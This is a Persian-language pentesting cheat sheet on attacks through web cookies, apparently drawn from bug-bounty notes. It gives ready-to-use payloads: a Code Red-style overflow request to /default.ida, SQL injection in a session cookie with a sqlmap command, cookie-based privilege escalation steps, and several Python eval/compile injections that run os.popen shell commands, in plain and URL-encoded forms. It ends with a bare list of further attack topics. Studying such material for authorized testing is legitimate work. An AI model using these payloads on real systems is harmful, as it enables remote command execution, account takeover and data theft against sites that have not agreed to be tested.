# 10.cookie attack

داده های حساس ذخیره شده در کوکی ها

بررسی کنید که pii(داده هایی که برای تشخیص هویت استفاده میشه) یا سایر اطلاعات حساس در کوکی‌ها ذخیره شده. این اطلاعات معمولا شامل: ایمیل, session ID, داده‌های تولد, شماره تلفن همراه، کد ملی و… هست

تجاوز طول کوکی منجر به Buffer Overflow میشه: طول کوکی که بیشتر از طول اطلاعات کاربری شده میتونه نشون بده که تلاش برای حمله Buffer Overflow انجام میشه. در یک حمله Buffer Overflow, مهاجم باید string های بسیار طولانی رو ارسال کنه که overflow رو ایجاد میکنه

```
GET  /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531 بb%u53ff%u0078%u0000%u00=a
```

Arbitrary Cookie injection

سعی کنید چند کوکی دلخواه رو با استفاده از حملاتی مثل CRLF injection تزریق کنید.
گاهی اوقات میشه ازش برای افزایش دسترسی استفاده کرد یا در صورت نقص عملکرد اپلیکیشن, میشه اطلاعات حساسو از طریق ردپای stack نشون بده

Mass Assignment

شبیه parameter pollution هست. اما در این مورد attacker سعی میکنه چندین یوزر ID رو در همون پارامتر user_id تزریق کند

Denial of service - cookie Bomb

مجبور کردن سرور به پردازش کوکی های بزرگتر از اندازه کوکی مشخص شده توسط سرور ممکنه باعث حمله DOS بشه

```
https://target.com/index.php?param1=xxxxxxxxxxxxxxxxxxxxxx
```

بعد از وارد کردن “xxxxxxxxxxxxxxxxxxxxxx” به عنوان مقدار param1, کوکی هاتونو بررسی کنید. اگر کوکی‌هایی وجود داشته باشه که مقدارشون "xxxxxxxxxxxxxxxxxxxxxxxx" باشه, به این معنیه که وب سایت اسیب پذیر هست

منبع: [Hackerone #105363](https://hackerone.com/reports/105363)

SQL injection

چطور کد رو در کوکی ها تزریق کنیم؟

خیلی از interceptor های HTTP و ویرایشگرهای HTTP وجود دارند که میتونند ریکوئست HTTP رو قبل از ارسال به سرور intercept(رهگیری) کنند. بعدش تستر میتونه کدهای SQL مخرب خودشو در فیلد کوکی وارد کنه

این مثل یک تزریق SQL مبتنی بر GET/POST هست, با این تفاوت که کاراکترهای خاصی رو نمیشه استفاده کرد. برای مثال `;` و `,` معمولا به عنوان جداکننده در نظر گرفته میشند, بنابراین اگر URL انکد نشده باشند تزریق رو پایان میده

```
Cookie : sessionId=xxxbad1fdc’ order by 1# (Normal)_
Cookie : sessionId=xxxbad1fdc’ order by 2# (Error)_

بعد از ارور
sqlmap -u "" --cookie="" -p "" --dbs
```

parameter pollution

فرض کنید کوکی از پارامتری به نام `=user_id` برای برگردوندن بغضی داده ها استفاده میکنه

با این حال اپلیکیشن در برابر IDOR اسیب پذیر نیست و تغییر مقدار user_id به ID قربانی کمکی به شما نمیکنه

مهاجم یک مقدار پارامتر `=user_id` دیگه به کوکی با user ID قربانی اضافه میکنه,  مثل: `user_id=atacker&user_id=victim`

سه چیز در اینجا میتونه اتفاق بیفته:

اپلیکیشن ممکنه داده های قربانی رو برگردونه

اپلیکیشن ممکنه داده های قربانی و اطلاعات مهاجم رو برگردونه

اپلیکیشن داده ها رو برنمیگردونه اسیب پذیر نیست

Authentication Bypass (cookie are not valid)

سعی کنید با حذف کوکی ها به یک منبع محافظت شده دسترسی پیدا کنید

xss

فرض کنید که مقدار "name" پارامتر کوکی در اپلیکیشن برگشت داده بشه

مقدار "name" رو پیلود xss تونو بزارید

Insufficient session management

با خروج از اپلیکیشن session منقضی نمیشه

 انقضای session طولانی

با تغییر پسورد session منقضی نمیشه

مورد اخر session هم زمان

privilege escalation

- horizontal

فرض کنید که اپلیکیشن از مدل های چند سازمانی استفاده میکنه

از کوکی ها برای تعیین سازمانی که کاربر میتونه بهشون دسترسی داشته باشه استفاده میشه

برای دسترسی به سازمان های دیگه کوکی رو تغییر بدید

- vertical

فرض کنید از کوکی برای تعیین سطح دسترسی کاربر استفاده میشه

کوکی رو به منظور ارتقا سطح دسترسی کاربر تغییر بدید (مثلا پارامتر role اگر داشت و نوشته بود user یا چیزای مشابه به admin یا… تغییرش بدید)

- similarly

سعی کنید از کوکی های کاربران سطح پایین تر(کاربر معمولی) برای دسترسی به قابلیت های کاربرای سطح بالاتر(کاربر پریمیوم) استفاده کنید

سعی کنید از کوکی کاربر سازمان 1 برای دسترسی به قابلیت های سازمان 2 استفاده کنید

session puzzling

موقعی که یک اپلیکیشن از یک متغیر session برای مقاصد گوناگون استفاده می کنه, مهاجم میتونه ازش سو استفاده کنه تا اپلیکیشن رو فریب بده و کارشو به عنوان یک کاربر معتبر یا خاص انجام بده

Exploiting Python Code Injection this payload in cookie or contenttype or path or parameter

```python
eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))
```

OS command injection

```python
**eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))**
```

```python
eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
```

```python
**__import__('os').popen('COMMAND').read()**
```

URL encode some characters

```python
param=eval%28compile%28%27for%20x%20in%20range%281%29%3A%0A%20import%20time%0A%20time.sleep%2820%29%27%2C%27a%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22for%20x%20in%20range%281%29%3A%5Cn%20import%20os%5Cn%20os.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=eval%28compile%28%22%22%22__import__%28%27os%27%29.popen%28r%27COMMAND%27%29.read%28%29%22%22%22%2C%27%27%2C%27single%27%29%29
```

```python
param=__import__%28%27os%27%29.popen%28%27COMMAND%27%29.read%28%29
```

یک مثال:

```python
__import__('os').popen('COMMAND').read()
```

یک مثال چند دستوری که با ویرگول از هم جدا شدن

```python
str("-"*50),__import__('os').popen('COMMAND').read()
```

Insecure Deserialization

اگر کوکی‌ها از serialized objects استفاده می‌کنند, سعی کنید insecure Deserialization رو امتحان کنید

Electronic Code Book

Pickle Code Execution

Cipher block chaining

file inclusion

IDOR

session fixation

padding oracle attack

JWT attack